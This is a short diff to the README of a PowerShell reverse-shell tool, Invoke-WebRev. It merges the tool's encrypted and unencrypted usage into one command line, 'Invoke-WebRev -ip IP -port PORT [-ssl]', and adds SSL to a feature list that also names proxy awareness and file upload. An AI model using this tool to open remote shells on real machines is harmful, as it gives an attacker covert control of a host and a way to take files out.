@@ -19,14 +19,7 @@ On your server:
 On your client:
 ```
 Import-Module .\Invoke-WebRev.ps1
-```
-```
-Reverse Shell without encryption:
-    Invoke-WebRev -ip IP -port PORT
-```
-```
-Reverse Shell with encryption:
-    Invoke-WebRev -ssl -ip IP -port PORT
+Invoke-WebRev -ip IP -port PORT [-ssl]
 ```
 
 # Extra functions
@@ -36,6 +29,7 @@ Upload
 ```
 
 # Features
+    - SSL
     - Proxy Aware
     - Upload Function
 
